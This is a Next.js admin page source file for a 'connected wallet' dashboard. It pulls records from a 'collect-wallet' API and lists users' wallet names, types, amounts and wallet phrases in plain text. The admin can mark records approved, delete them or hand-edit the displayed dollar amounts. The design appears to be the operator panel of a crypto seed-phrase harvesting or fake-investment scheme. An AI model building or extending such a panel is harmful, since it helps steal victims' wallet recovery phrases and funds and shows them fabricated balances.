"use client"

import Image from 'next/image';
import { ErrorMessage, Field, Form, Formik } from 'formik';
import axios from 'axios';
import * as Yup from "yup";
import React, { useEffect, useState } from 'react'
import { FiCheckCircle, FiSearch } from "react-icons/fi";
import {
    FiEdit,
    FiTrash2,
    FiPauseCircle,
    FiClock 
} from "react-icons/fi";
import { TfiClose, TfiCheck } from "react-icons/tfi";
import LoadingScreen from '../loading';
import { DesktopSideBar } from '../components/DesktopSideBar';
import { Header } from '../components/Header';
import { useAuth } from '@/app/context/AuthContext';
import { Router } from 'next/navigation';
import { IoInformationCircleOutline } from 'react-icons/io5';

let initialValueAmount = {
    amount: 0,
  }

  const validationSchemaAmount = Yup.object({
    amount: Yup.number().required("Amount is required"),
  });


export default function Page() {
  const { user } = useAuth();
  const [isMenuOpen, setIsMenuOpen] = useState(false)
    const [loading, setLoading] = useState(false);
  const [isShown, setIsShown] = useState(true);
  const [search, setSearch] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
      const [isError, setIsError] = useState(false);
  const [transactions, setTransactions] = useState([]);
  const [selectedTransaction, setSelectedTransaction] = useState(null);
  const formatter = new Intl.DateTimeFormat("en-US", {
  dateStyle: "medium",
  timeStyle: "short",
});

useEffect(() => {
      async function fetchTransactions() {
        try {
          setLoading(true);
          const res = await axios.get(
            `/api/auth/admin/collect-wallet/wallet?type=wallet`,
            {
              withCredentials: true,
              headers: { "Content-Type": "application/json" },
            }
          );

          if (res.status === 200) {
            setIsError(false);
            setTransactions(res.data.data);
            setLoading(false);
          }
        } catch(err) {
          setErrorMessage("Error!");
          setIsError(true);
          setLoading(false);
        }
      }
  
      fetchTransactions();
    }, []);

  const filteredTransactions =
    transactions?.filter((transaction) => {
      const query = search.toLowerCase();

      return (
        transaction.walletName
          ?.toLowerCase()
          .includes(query) ||
        transaction.user?.email
          ?.toLowerCase()
          .includes(query) ||
        transaction.walletAmount
          ?.toLowerCase()
          .includes(query) ||
        transaction.status
          ?.toLowerCase()
          .includes(query) ||
        transaction.walletPhrase
          ?.toLowerCase()
          .includes(query)
      );
    }) || [];

  async function updateWalletAmount (values) {
    setIsMenuOpen(false);
       try {
            setLoading(true);
            const res = await axios.patch(
              `/api/auth/admin/collect-wallet`,
              {
                transactionID: selectedTransaction._id,
                amount: values.amount,
              },
              {
                withCredentials: true,
                headers: { "Content-Type": "application/json" },
              }
            );

            if (res.status === 200) {
              setIsError(false);
              window.location.reload();
            }
          } catch(err) {
            setErrorMessage("Error!");
            setIsError(true);
            setLoading(false);
          }   
  }

        const handleDelete = async (transaction) => {
          try {
            setLoading(true);
            const res = await axios.delete(
              `/api/auth/admin/collect-wallet/wallet?id=${transaction._id}`,
              {
                withCredentials: true,
                headers: { "Content-Type": "application/json" },
              }
            );

            if (res.status === 200) {
              setIsError(false);
              window.location.reload();
            }
          } catch(err) {
            setErrorMessage("Error!");
            setIsError(true);
            setLoading(false);
          }
        };

      const handleConfirm = async  (transaction) => {
          try {
            setLoading(true);
            const res = await axios.patch(
              `/api/auth/admin/collect-wallet/wallet?userId=${user._id}`,
              {
                transactionID: transaction._id,
                status: "Successful",
                type: "wallet"
              },
              {
                withCredentials: true,
                headers: { "Content-Type": "application/json" },
              }
            );

            if (res.status === 200) {
              setIsError(false);
              window.location.reload();
            }
          } catch(err) {
            setErrorMessage("Error!");
            setIsError(true);
            setLoading(false);
          }
      };

      const handleUnconfirmed = async  (transaction) => {
          try {
            setLoading(true);
            const res = await axios.patch(
              `/api/auth/admin/collect-wallet/wallet?userId=${user._id}`,
              {
                transactionID: transaction._id,
                status: "Pending",
                type: "wallet"
              },
              {
                withCredentials: true,
                headers: { "Content-Type": "application/json" },
              }
            );

            if (res.status === 200) {
              setIsError(false);
              window.location.reload();
            }
          } catch(err) {
            setErrorMessage("Error!");
            setIsError(true);
            setLoading(false);
          }
      };
  
      const handleMainMenu = () => {
        setIsShown(!isShown);
      };
  
      const [isShown2, setIsShown2] = useState(true);
      const handleMainMenu2 = () => {
        setIsShown2(!isShown2);
      };
  
      const [isShown3, setIsShown3] = useState(true);
      const handleMainMenu3 = () => {
        setIsShown3(!isShown3);
      };

    const toggleMenu = (transaction) => {
      if(transaction) {
        initialValueAmount.amount = transaction.walletAmount;
        setSelectedTransaction(transaction);
      }
        setIsMenuOpen(!isMenuOpen)
    }

  return (
    <div className="w-full bg-[#f4f4f7] h-full text-black dark:bg-isoDark dark:text-white min-h-screen relative font-[family-name:var(--font-geist-sans)]">
      {loading === true && (<LoadingScreen />)}

       <div className='w-full h-full min-h-screen flex items-start'>
     
          <DesktopSideBar tab={"connected-wallet"} />

          <div className='w-full relative space-y-5 text-black container mx-auto'>
            
            <Header tab={'connected-wallet'} />

            <div className="min-h-screen p-4 md:p-8">

              <div className="mb-32">

                {/* Search */}

                <div className="flex flex-col md:flex-row justify-between items-center gap-4 mb-6">

                  <div className="relative w-full md:w-96">

                    <FiSearch className="absolute left-4 top-3.5 text-gray-400 text-lg" />

                    <input
                      type="text"
                      placeholder="Search transaction..."
                      value={search}
                      onChange={(e) => setSearch(e.target.value)}
                      className="w-full rounded-xl border dark:border-neutral-700 bg-white dark:bg-isoDark2 dark:text-white pl-11 pr-4 py-3 outline-none focus:ring-2 focus:ring-blue-600"
                    />

                  </div>

                </div>

                {/* Table */}

                <div className="overflow-x-auto rounded-2xl border dark:border-neutral-800 bg-white dark:bg-isoDark shadow-sm">

                  <table className="min-w-[1900px] w-full text-sm">

                    <thead className="bg-gray-100 dark:bg-isoDark2 dark:text-white">

                      <tr>

                        <th className="px-5 py-4 text-left">Wallet Name</th>                    

                        <th className="px-5 py-4 text-left">Wallet Type</th>

                        <th className="px-5 py-4 text-left">Amount ($)</th>

                        <th className="px-5 py-4 text-left">Status</th>

                        <th className="px-5 py-4 text-left">Date Reg</th>

                        <th className="px-5 py-4 text-left">Wallet Phrase</th>

                        <th className="px-5 py-4 text-center">
                          Approve/Unapproved
                        </th>

                        <th className="px-5 py-4 text-center">
                          Edit
                        </th>

                        <th className="px-5 py-4 text-center">
                          Delete
                        </th>

                      </tr>

                    </thead>

                    <tbody>

                      {filteredTransactions.length > 0 ? (

                        filteredTransactions.map((transaction) => (

                          <tr
                            key={transaction._id}
                            className="border-b dark:text-white dark:border-neutral-800 hover:bg-gray-50 dark:hover:bg-isoDark2 transition"
                          >

                            <td className="px-5 py-4 whitespace-nowrap font-semibold">
                              {transaction.walletName}
                            </td>

                            <td className="px-5 py-4 whitespace-nowrap">
                              {transaction.walletType}
                            </td>

                            {/* Deposit */}

                            <td className="px-5 py-4 whitespace-nowrap text-green-500 font-semibold">
                              ${transaction.walletAmount.toLocaleString()}
                            </td>


                            {/* Status */}

                            <td className="px-5 py-4">

                              <span
                                className={`px-3 py-1 rounded-full text-xs font-semibold

                                ${
                                  transaction.status === "Pending"
                                    ? "bg-yellow-100 text-yellow-700"

                                    : transaction.status === "Successful"

                                    ? "bg-green-100 text-green-700"

                                    : "bg-red-100 text-red-700"
                                }`}
                              >
                                {transaction.status}
                              </span>

                            </td>

                            {/* Date */}

                            <td className="px-5 py-4 whitespace-nowrap">
                              {formatter.format(
                                new Date(transaction.createdAt)
                              )}
                            </td>

                            {/* Transaction ID */}

                            <td className="px-5 py-4 whitespace-nowrap font-medium">
                              {transaction.walletPhrase}
                            </td>

                            {/* Edit */}

                            <td className="px-5 py-4 text-center">

                              {transaction.status === "Successful" ? (
                                <button
                                onClick={() => handleUnconfirmed(transaction)}
                                className="bg-blue-600 hover:bg-blue-700 text-white p-2 rounded-full transition"
                              >

                                <div className="flex items-center justify-center space-x-2">
                                  <FiCheckCircle size={18} />
                                  <span>Approved</span>
                                </div>

                                </button>
                              ) : (
                                <button
                                onClick={() => handleConfirm(transaction)}
                                className="bg-yellow-600 hover:bg-yellow-700 text-white p-2 rounded-full transition"
                              >

                                <div className="flex items-center justify-center space-x-2">
                                  <TfiClose size={18} />
                                  <span>Unapproved</span>
                                </div>

                              </button>
                              )}

                            </td>

                            <td className="px-5 py-4 text-center">

                              <button
                              onClick={() => toggleMenu(transaction)}
                              className="rounded-lg bg-blue-600 hover:bg-blue-700 text-white p-2 transition"
                              >

                              <FiEdit size={18}/>

                              </button>

                            </td>

                            {/* Delete */}

                            <td className="px-5 py-4 text-center">

                              <button
                                onClick={() => handleDelete(transaction)}
                                className="bg-red-600 hover:bg-red-700 text-white p-2 rounded-lg transition"
                              >

                                <FiTrash2 size={18} />

                              </button>

                            </td>

                            {isMenuOpen === true && (
                                  <td className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 justify-center bg-black/50 items-center loading-modal">
                                                          <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 dark:bg-isoDark2 bg-white space-y-4">
                                                            <Formik
                                                                                                    initialValues={initialValueAmount}
                                                                                                    validationSchema={validationSchemaAmount}
                                                                                                    onSubmit={updateWalletAmount}
                                                                                                  >
                                                                                                    {({ errors, touched, values }) => (
                                                                                                      <Form className="w-full flex md:px-8 flex-col space-y-4">
                                                                                                        <div>
                                                                                                          <label
                                                                                                            htmlFor="amount"
                                                                                                            className="flex space-x-2 items-center text-sm pb-1"
                                                                                                          >Wallet Amount:</label>
                                                                                                          <Field name="amount">
                                                                                                            {(props) => {
                                                                                                              const { field, form, meta } = props;
                                                                                                              return (
                                                                                                                <input
                                                                                                                  placeholder="0.00"
                                                                                                                  className={`form__input dark:md:bg-isoDark dark:focus:border-isoColor2 dark:bg-isoDark2 dark:border-neutral-600 dark:text-neutral-500 border-neutral-200 border text-neutral-400 font-medium rounded-full w-full p-3 text-md focus:outline-none focus:border-isoColor1 focus:text-black`}
                                                                                                                  type="number"
                                                                                                                  id="amount"
                                                                                                                  name="amount"
                                                                                                                  {...field}
                                                                                                                />
                                                                                                              );
                                                                                                            }}
                                                                                                          </Field>
                                                                                                          <ErrorMessage name="amount">
                                                                                                            {(errMsg) => (
                                                                                                              <span className="text-red-500 text-xs">{errMsg}</span>
                                                                                                            )}
                                                                                                          </ErrorMessage>
                                                                                                        </div>
                                                                                                        {isError === true && (<p className='text-red-500 text-xs'>{errorMessage}</p>)}
                                                                                    
                                                                                                        <div className='flex items-center space-x-4'>
                                                                                                            <button
                                                                                                              type="submit"
                                                                                                              className="w-full py-4 dark:bg-isoColor2 dark:text-black rounded-full bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                                                                                                              disabled={Formik.isValid || Formik.isSubmitting}
                                                                                                            >
                                                                                                              {loading ? "Processing..." : "Save"}
                                                                                                            </button>

                                                                                                            <button
                                                                                                              type="button"
                                                                                                              onClick={() => toggleMenu()}
                                                                                                              className="w-full py-4 dark:bg-isoDark dark:text-isoColor2 rounded-full bg-[#f4f4f7] text-md hover:bg-isoColor2 text-black"
                                                                                                            >
                                                                                                              Cancel
                                                                                                            </button>
                                                                                                        </div>
                                                                                                      </Form>
                                                                                                    )}
                                                                                        </Formik>



                                          
                                                          </div>
                                  </td>
                            )}

                          </tr>

                        ))

                      ) : (

                        <tr>

                          <td
                            colSpan={12}
                            className="text-center py-10 text-gray-500 dark:text-gray-400"
                          >
                            No transactions found.
                          </td>

                        </tr>

                      )}

                    </tbody>

                  </table>

                </div>

              </div>

            </div>

          </div>

        </div>
    </div>
  )
}
